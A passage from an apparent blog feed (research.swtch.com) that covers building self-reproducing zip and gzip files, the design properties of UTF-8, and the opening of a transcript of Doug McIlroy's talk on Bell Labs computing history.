0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt; L1 L1 L4&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;R4 L4 R4 L4&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R4 L4 R4 L4&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;repeat last 4 printed bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R4&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R4 L4 R4 L4&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;R4 L0 L0 L&lt;/span&gt;&lt;/code&gt;&lt;span style=&#34;color: #005500&#34;&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;&lt;/span&gt;&lt;code&gt;&lt;span style=&#34;color: #005500&#34;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R4 L0 L0 L&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;repeat last 4 printed bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R4&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R4 L0 L0 L&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;no-op&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L0&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;no-op&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L0&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;print &lt;/i&gt;s&lt;i&gt;+1 bytes&lt;/i&gt;&lt;/span&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt; &lt;span style=&#34;color: #005500&#34;&gt;R&lt;/span&gt;&lt;/code&gt;&lt;span style=&#34;color: #005500&#34;&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;&lt;/span&gt;&lt;code&gt;&lt;span style=&#34;color: #005500&#34;&gt; [S]&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt; [S]&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;repeat last &lt;/i&gt;s&lt;i&gt;+1 bytes&lt;/i&gt;&lt;/span&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt; [S]&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print suffix&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;[S]&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;S&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&lt;br&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;(The byte sequence in the Output column is &lt;code&gt;&lt;i&gt;P&lt;/i&gt;&lt;/code&gt;, then&#xA;the byte sequence from the Code column, then &lt;code&gt;&lt;i&gt;S&lt;/i&gt;&lt;/code&gt;.)&#xA;&lt;/p&gt;&#xA;&#xA;&#xA;&lt;h3&gt;Self-reproducing zip files&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Now the rubber meets the road.&#xA;We&#39;ve solved the main theoretical obstacle to making a self-reproducing&#xA;zip file, but there are a couple practical obstacles&#xA;still in our way.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The first obstacle is to translate our self-reproducing Lempel-Ziv program,&#xA;written in simplified opcodes, into the real opcode encoding.&#xA;&lt;a href=&#34;http://www.ietf.org/rfc/rfc1951.txt&#34;&gt;RFC 1951&lt;/a&gt; describes the DEFLATE format used in both gzip and zip: a sequence of blocks, each of which&#xA;is a sequence of opcodes encoded using Huffman codes.&#xA;Huffman codes assign different length bit strings&#xA;to different opcodes,&#xA;breaking our assumption above that opcodes have&#xA;fixed length.&#xA;But wait!&#xA;We can, with some care, find a set of fixed-size encodings&#xA;that says what we need to be able to express.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;In DEFLATE, there are literal blocks and opcode blocks.&#xA;The header at the beginning of a literal block is 5 bytes:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/zip1.png&#34;&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;If the translation of our &lt;code&gt;L&lt;/code&gt; opcodes above&#xA;are 5 bytes each, the translation of the &lt;code&gt;R&lt;/code&gt; opcodes&#xA;must also be 5 bytes each, with all the byte counts&#xA;above scaled by a factor of 5.&#xA;(For example, &lt;code&gt;L4&lt;/code&gt; now has a 20-byte argument,&#xA;and &lt;code&gt;R4&lt;/code&gt; repeats the last 20 bytes of output.)&#xA;The opcode block&#xA;with a single &lt;code&gt;repeat(20,20)&lt;/code&gt; instruction falls well short of&#xA;5 bytes:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/zip2.png&#34;&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&#xA;&lt;p class=lp&gt;Luckily, an opcode block containing two&#xA;&lt;code&gt;repeat(20,10)&lt;/code&gt; instructions has the same effect and is exactly 5 bytes:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/zip3.png&#34;&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Encoding the other sized repeats&#xA;(&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt; and&#xA;&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt;)&#xA;takes more effort&#xA;and some sleazy tricks, but it turns out that&#xA;we can design 5-byte codes that repeat any amount&#xA;from 9 to 64 bytes.&#xA;For example, here are the repeat blocks for 10 bytes and for 40 bytes:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/zip4.png&#34;&gt;&#xA;&lt;br&gt;&#xA;&lt;img src=&#34;http://research.swtch.com/zip5.png&#34;&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;The repeat block for 10 bytes is two bits too short,&#xA;but every repeat block is followed by a literal block,&#xA;which starts with three zero bits and then padding&#xA;to the next byte boundary.&#xA;If a repeat block ends two bits short of a byte&#xA;but is followed by a literal block, the literal block&#39;s&#xA;padding will insert the extra two bits.&#xA;Similarly, the repeat block for 40 bytes is five bits too long,&#xA;but they&#39;re all zero bits.&#xA;Starting a literal block five bits too late&#xA;steals the bits from the padding.&#xA;Both of these tricks only work because the last 7 bits of&#xA;any repeat block are zero and the bits in the first byte&#xA;of any literal block are also zero,&#xA;so the boundary isn&#39;t directly visible.&#xA;If the literal block started with a one bit,&#xA;this sleazy trick wouldn&#39;t work.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;The second obstacle is that zip archives (and gzip files)&#xA;record a CRC32 checksum of the uncompressed data.&#xA;Since the uncompressed data is the zip archive,&#xA;the data being checksummed includes the checksum itself.&#xA;So we need to find a value &lt;i&gt;x&lt;/i&gt; such that writing &lt;i&gt;x&lt;/i&gt; into&#xA;the checksum field causes the file to checksum to &lt;i&gt;x&lt;/i&gt;.&#xA;Recursion strikes back.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The CRC32 checksum computation interprets the entire file as a big number and computes&#xA;the remainder when you divide that number by a specific constant&#xA;using a specific kind of division.&#xA;We could go through the effort of setting up the appropriate&#xA;equations and solving for &lt;i&gt;x&lt;/i&gt;.&#xA;But frankly, we&#39;ve already solved one nasty recursive puzzle&#xA;today, and &lt;a href=&#34;http://www.youtube.com/watch?v=TQBLTB5f3j0&#34;&gt;enough is enough&lt;/a&gt;.&#xA;There are only four billion possibilities for &lt;i&gt;x&lt;/i&gt;:&#xA;we can write a program to try each in turn, until it finds one that works.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;If you want to recreate these files yourself, there are a&#xA;few more minor obstacles, like making sure the tar file is a multiple&#xA;of 512 bytes and compressing the rather large zip trailer to&#xA;at most 59 bytes so that &lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;s&lt;/i&gt;+1&lt;/span&gt; is&#xA;at most &lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;64&lt;/span&gt;.&#xA;But they&#39;re just a simple matter of programming.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;So there you have it:&#xA;&lt;code&gt;&lt;a href=&#34;http://swtch.com/r.gz&#34;&gt;r.gz&lt;/a&gt;&lt;/code&gt; (gzip files all the way down),&#xA;&lt;code&gt;&lt;a href=&#34;http://swtch.com/r.tar.gz&#34;&gt;r.tar.gz&lt;/a&gt;&lt;/code&gt; (gzipped tar files all the way down),&#xA;and&#xA;&lt;code&gt;&lt;a href=&#34;http://swtch.com/r.zip&#34;&gt;r.zip&lt;/a&gt;&lt;/code&gt; (zip files all the way down).&#xA;I regret that I have been unable to find any programs&#xA;that insist on decompressing these files recursively, ad infinitum.&#xA;It would have been fun to watch them squirm, but&#xA;it looks like much less sophisticated&#xA;&lt;a href=&#34;http://en.wikipedia.org/wiki/Zip_bomb&#34;&gt;zip bombs&lt;/a&gt; have spoiled the fun.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;If you&#39;re feeling particularly ambitious, here is&#xA;&lt;a href=&#34;http://swtch.com/rgzip.go&#34;&gt;rgzip.go&lt;/a&gt;,&#xA;the &lt;a href=&#34;http://golang.org/&#34;&gt;Go&lt;/a&gt; program that generated these files.&#xA;I wonder if you can create a zip file that contains a gzipped tar file&#xA;that contains the original zip file.&#xA;Ken Thompson suggested trying to make a zip file that&#xA;contains a slightly larger copy of itself, recursively,&#xA;so that as you dive down the chain of zip files&#xA;each one gets a little bigger.&#xA;(If you do manage either of these, please leave a comment.)&#xA;&lt;/p&gt;&#xA;&#xA;&lt;br&gt;&#xA;&lt;p class=lp&gt;&lt;font size=-1&gt;P.S.  I can&#39;t end the post without sharing my favorite self-reproducing program: the one-line shell script &lt;code&gt;#!/bin/cat&lt;/code&gt;&lt;/font&gt;.&#xA;&lt;/p&gt;&lt;/p&gt;&#xA;&#xA;&#xA;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>UTF-8: Bits, Bytes, and Benefits</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/utf8</id>
    <link rel="alternate" href="http://research.swtch.com/utf8"></link>
    <published>2010-03-05T00:00:00-05:00</published>
    <updated>2010-03-05T00:00:00-05:00</updated>
    <summary type="text">The reasons to switch to UTF-8</summary>
    <content type="html">&#xA;&lt;p&gt;&lt;p class=pp&gt;&#xA;UTF-8 is a way to encode Unicode code points&amp;#8212;integer values from&#xA;0 through 10FFFF&amp;#8212;into a byte stream,&#xA;and it is far simpler than many people realize.&#xA;The easiest way to make it confusing or complicated&#xA;is to treat it as a black box, never looking inside.&#xA;So let&#39;s start by looking inside.  Here it is:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;table cellspacing=5 cellpadding=0 border=0&gt;&#xA;&lt;tr height=10&gt;&lt;th colspan=4&gt;&lt;/th&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;th align=center colspan=2&gt;Unicode code points&lt;/th&gt;&lt;th width=10&gt;&lt;th align=center&gt;UTF-8 encoding (binary)&lt;/th&gt;&lt;/tr&gt;&#xA;&lt;tr height=10&gt;&lt;td colspan=4&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;00-7F&lt;/td&gt;&lt;td&gt;(7 bits)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td align=right&gt;0&lt;i&gt;tuvwxyz&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;0080-07FF&lt;/td&gt;&lt;td&gt;(11 bits)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td align=right&gt;110&lt;i&gt;pqrst&lt;/i&gt;&amp;nbsp;10&lt;i&gt;uvwxyz&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;0800-FFFF&lt;/td&gt;&lt;td&gt;(16 bits)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td align=right&gt;1110&lt;i&gt;jklm&lt;/i&gt;&amp;nbsp;10&lt;i&gt;npqrst&lt;/i&gt;&amp;nbsp;10&lt;i&gt;uvwxyz&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right valign=top&gt;010000-10FFFF&lt;/td&gt;&lt;td&gt;(21 bits)&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td align=right valign=top&gt;11110&lt;i&gt;efg&lt;/i&gt;&amp;nbsp;10&lt;i&gt;hijklm&lt;/i&gt; 10&lt;i&gt;npqrst&lt;/i&gt;&amp;nbsp;10&lt;i&gt;uvwxyz&lt;/i&gt;&lt;/td&gt;&#xA;&lt;tr height=10&gt;&lt;td colspan=4&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;The convenient properties of UTF-8 are all consequences of the choice of encoding.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;i&gt;All ASCII files are already UTF-8 files.&lt;/i&gt;&lt;br&gt;&#xA;The first 128 Unicode code points are the 7-bit ASCII character set,&#xA;and UTF-8 preserves their one-byte encoding.&#xA;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;i&gt;ASCII bytes always represent themselves in UTF-8 files.  They never appear as part of other UTF-8 sequences.&lt;/i&gt;&lt;br&gt;&#xA;All the non-ASCII UTF-8 sequences consist of bytes&#xA;with the high bit set, so if you see the byte 0x7A in a UTF-8 file,&#xA;you can be sure it represents the character &lt;code&gt;z&lt;/code&gt;.&#xA;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;i&gt;ASCII bytes are always represented as themselves in UTF-8 files.  They cannot be hidden inside multibyte UTF-8 sequences.&lt;/i&gt;&lt;br&gt;&#xA;The ASCII &lt;code&gt;z&lt;/code&gt; 01111010 cannot be encoded as a two-byte UTF-8 sequence&#xA;11000001 10111010&lt;/code&gt;.  Code points must be encoded using the shortest&#xA;possible sequence.&#xA;A corollary is that decoders must detect long-winded sequences as invalid.&#xA;In practice, it is useful for a decoder to use the Unicode replacement&#xA;character, code point FFFD, as the decoding of an invalid UTF-8 sequence&#xA;rather than stop processing the text.&#xA;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;i&gt;UTF-8 is self-synchronizing.&lt;/i&gt;&lt;br&gt;&#xA;Let&#39;s call a byte of the form 10&lt;i&gt;xxxxxx&lt;/i&gt;&#xA;a continuation byte.&#xA;Every UTF-8 sequence is a byte that is not a continuation byte&#xA;followed by zero or more continuation bytes.&#xA;If you start processing a UTF-8 file at an arbitrary point,&#xA;you might not be at the beginning of a UTF-8 encoding,&#xA;but you can easily find one: skip over&#xA;continuation bytes until you find a non-continuation byte.&#xA;(The same applies to scanning backward.)&#xA;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;i&gt;Substring search is just byte string search.&lt;/i&gt;&lt;br&gt;&#xA;Properties 2, 3, and 4 imply that given a string&#xA;of correctly encoded UTF-8, the only way those bytes&#xA;can appear in a larger UTF-8 text is when they represent the&#xA;same code points.  So you can use any 8-bit safe byte at a time&#xA;search function, like &lt;code&gt;strchr&lt;/code&gt; or &lt;code&gt;strstr&lt;/code&gt;, to run the search.&#xA;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;i&gt;Most programs that handle 8-bit files safely can handle UTF-8 safely.&lt;/i&gt;&lt;br&gt;&#xA;This also follows from Properties 2, 3, and 4.&#xA;I say &amp;ldquo;most&amp;rdquo; programs, because programs that&#xA;take apart a byte sequence expecting one character per byte&#xA;will not behave correctly, but very few programs do that.&#xA;It is far more common to split input at newline characters,&#xA;or split whitespace-separated fields, or do other similar parsing&#xA;around specific ASCII characters.&#xA;For example, Unix tools like cat, cmp, cp, diff, echo, head, tail, and tee&#xA;can process UTF-8 files as if they were plain ASCII files.&#xA;Most operating system kernels should also be able to handle&#xA;UTF-8 file names without any special arrangement, since the&#xA;only operations done on file names are comparisons&#xA;and splitting at &lt;code&gt;/&lt;/code&gt;.&#xA;In contrast, tools like grep, sed, and wc, which inspect arbitrary&#xA;individual characters, do need modification.&#xA;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;i&gt;UTF-8 sequences sort in code point order.&lt;/i&gt;&lt;br&gt;&#xA;You can verify this by inspecting the encodings in the table above.&#xA;This means that Unix tools like join, ls, and sort (without options) don&#39;t need to handle&#xA;UTF-8 specially.&#xA;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;i&gt;UTF-8 has no &amp;ldquo;byte order.&amp;rdquo;&lt;/i&gt;&lt;br&gt;&#xA;UTF-8 is a byte encoding.  It is not little endian or big endian.&#xA;Unicode defines a byte order mark (BOM) code point FFFE,&#xA;which are used to determine the byte order of a stream of&#xA;raw 16-bit values, like UCS-2 or UTF-16.&#xA;It has no place in a UTF-8 file.&#xA;Some programs like to write a UTF-8-encoded BOM&#xA;at the beginning of UTF-8 files, but this is unnecessary&#xA;(and annoying to programs that don&#39;t expect it).&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;UTF-8 does give up the ability to do random&#xA;access using code point indices.&#xA;Programs that need to jump to the &lt;i&gt;n&lt;/i&gt;th&#xA;Unicode code point in a file or on a line&amp;#8212;text editors are the canonical example&amp;#8212;will&#xA;typically convert incoming UTF-8 to an internal representation&#xA;like an array of code points and then convert back to UTF-8&#xA;for output,&#xA;but most programs are simpler when written to manipulate UTF-8 directly.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Programs that make UTF-8 more complicated than it needs to be&#xA;are typically trying to be too general,&#xA;not wanting to make assumptions that might not be true of&#xA;other encodings.&#xA;But there are good tools to convert other encodings to UTF-8,&#xA;and it is slowly becoming the standard encoding:&#xA;even the fraction of web pages&#xA;written in UTF-8 is&#xA;&lt;a href=&#34;http://googleblog.blogspot.com/2010/01/unicode-nearing-50-of-web.html&#34;&gt;nearing 50%&lt;/a&gt;.&#xA;UTF-8 was explicitly designed&#xA;to have these nice properties.  Take advantage of them.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;For more on UTF-8, see &amp;ldquo;&lt;a href=&#34;https://9p.io/sys/doc/utf.html&#34;&gt;Hello World&#xA;or&#xA;Καλημέρα κόσμε&#xA;or&#xA;こんにちは 世界&lt;/a&gt;,&amp;rdquo; by Rob Pike&#xA;and Ken Thompson, and also this &lt;a href=&#34;http://www.cl.cam.ac.uk/~mgk25/ucs/utf-8-history.txt&#34;&gt;history&lt;/a&gt;.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&lt;font size=-1&gt;&#xA;&lt;p class=lp&gt;&#xA;Notes: Property 6 assumes the tools do not strip the high bit from each byte.&#xA;Such mangling was common years ago but is very uncommon now.&#xA;Property 7 assumes the comparison is done treating&#xA;the bytes as unsigned, but such behavior is mandated&#xA;by the ANSI C standard for &lt;code&gt;memcmp&lt;/code&gt;,&#xA;&lt;code&gt;strcmp&lt;/code&gt;, and &lt;code&gt;strncmp&lt;/code&gt;.&#xA;&lt;/p&gt;&#xA;&lt;/font&gt;&lt;/p&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Computing History at Bell Labs</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/bell-labs</id>
    <link rel="alternate" href="http://research.swtch.com/bell-labs"></link>
    <published>2008-04-09T00:00:00-04:00</published>
    <updated>2008-04-09T00:00:00-04:00</updated>
    <summary type="text">Doug McIlroy’s rememberances</summary>
    <content type="html">&#xA;&lt;p&gt;&lt;p class=pp&gt;&#xA;In 1997, on his retirement from Bell Labs, &lt;a href=&#34;http://www.cs.dartmouth.edu/~doug/&#34;&gt;Doug McIlroy&lt;/a&gt; gave a&#xA;fascinating talk about the &amp;ldquo;&lt;a href=&#34;https://web.archive.org/web/20081022192943/http://cm.bell-labs.com/cm/cs/doug97.html&#34;&gt;&lt;b&gt;History of Computing at Bell Labs&lt;/b&gt;&lt;/a&gt;.&amp;rdquo;&#xA;Almost ten years ago I transcribed the audio but never did anything with it.&#xA;The transcript is below.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;My favorite parts of the talk are the description of the bi-quinary decimal relay calculator&#xA;and the description of a team that spent over a year tracking down a race condition bug in&#xA;a missile detector (reliability was king: today you’d just stamp&#xA;&amp;ldquo;cannot reproduce&amp;rdquo; and send the report back).&#xA;But the whole thing contains many fantastic stories.&#xA;It’s well worth the read or listen.&#xA;I also like his recollection of programming using cards: &amp;ldquo;It’s the kind of thing you can be nostalgic about, but it wasn’t actually fun.&amp;rdquo;&#xA;&lt;/p&gt;&#xA;&#xA;&#xA;&lt;p class=pp&gt;&#xA;For more information, Bernard D. Holbrook and W. Stanley Brown’s 1982&#xA;technical report&#xA;&#xA;&amp;ldquo;&lt;a href=&#34;cstr99.pdf&#34;&gt;A History of Computing Research at Bell Laboratories (1937-1975)&lt;/a&gt;&amp;rdquo;&#xA;covers the earlier history in more detail.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&lt;i&gt;Corrections added August 19, 2009. Links updated May 16, 2018.&lt;/i&gt;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&lt;i&gt;Update, December 19, 2020.&lt;/i&gt; The original audio files disappeared along with the rest of the Bell Labs site some time ago, but I discovered a saved copy on one of my computers: [&lt;a href=&#34;mcilroy97history.mp3&#34;&gt;MP3&lt;/a&gt; | &lt;a href=&#34;mcilroy97history.rm&#34;&gt;original RealAudio&lt;/a&gt;].&#xA;I also added a few corrections and notes from Doug McIlroy, dated 2015 [sic].&lt;/p&gt;&#xA;&#xA;&lt;br&gt;&#xA;&lt;br&gt;&#xA;&#xA;&lt;p class=lp&gt;&lt;b&gt;Transcript&lt;/b&gt;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Computing at Bell Labs is certainly an outgrowth of the&#xA;&lt;a href=&#34;https://web.archive.org/web/20080622172015/http://cm.bell-labs.com/cm/ms/history/history.html&#34;&gt;mathematics department&lt;/a&gt;, which grew from that first hiring&#xA;in 1897, G A Campbell.  When Bell Labs was formally founded&#xA;in 1925, what it had been was the engineering department&#xA;of Western Electric.&#xA;When it was formally founded in 1925,&#xA;almost from the beginning there was a math department with Thornton Fry as the department head, and if you look at some of Fry’s work, it turns out that&#xA;he was fussing around in 1929 with trying to discover&#xA;information theory.  It didn’t actually gel until twenty years later with Shannon.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;1:10&lt;/span&gt;&#xA;Of course, most of the mathematics at that time was continuous.&#xA;One was interested in analyzing circuits and propagation.  And indeed, this is what led to the growth of computing in Bell Laboratories.  The computations could not all be done symbolically.  There were not closed form solutions.  There was lots of numerical computation done.&#xA;The math department had a fair stable of computers,&#xA;which in those days meant people. [laughter]&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 0.7em;&#34;&gt;2:00&lt;/span&gt;&#xA;And in the late ’30s, &lt;a href=&#34;http://en.wikipedia.org/wiki/George_Stibitz&#34;&gt;George Stibitz&lt;/a&gt; had an idea that some of&#xA;the work that they were doing on hand calculators might be&#xA;automated by using some of the equipment that the Bell System&#xA;was installing in central offices, namely relay circuits.&#xA;He went home, and on his kitchen table, he built out of relays&#xA;a binary arithmetic circuit.  He decided that binary was really&#xA;the right way to compute.&#xA;However, when he finally came to build some equipment,&#xA;he determined that binary to decimal conversion and&#xA;decimal to binary conversion was a drag, and he didn’t&#xA;want to put it in the equipment, and so he finally built&#xA;in 1939, a relay calculator that worked in decimal,&#xA;and it worked in complex arithmetic.&#xA;Do you have a hand calculator now that does complex arithmetic?&#xA;Ten-digit, I believe, complex computations: add, subtract,&#xA;multiply, and divide.&#xA;The I/O equipment was teletypes, so essentially all the stuff to make such&#xA;machines out of was there.&#xA;Since the I/O was teletypes, it could be remotely accessed,&#xA;and there were in fact four stations in the West Street Laboratories&#xA;of Bell Labs.  West Street is down on the left side of Manhattan.&#xA;I had the good fortune to work there one summer, right next to a&#xA;district where you’re likely to get bowled over by rolling beeves hanging from racks or tumbling cabbages.  The building is still there.  It’s called &lt;a href=&#34;http://query.nytimes.com/gst/fullpage.html?res=950DE3DB1F38F931A35751C0A96F948260&#34;&gt;Westbeth Apartments&lt;/a&gt;.  It’s now an artist’s colony.&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&lt;span style=&#34;font-size: 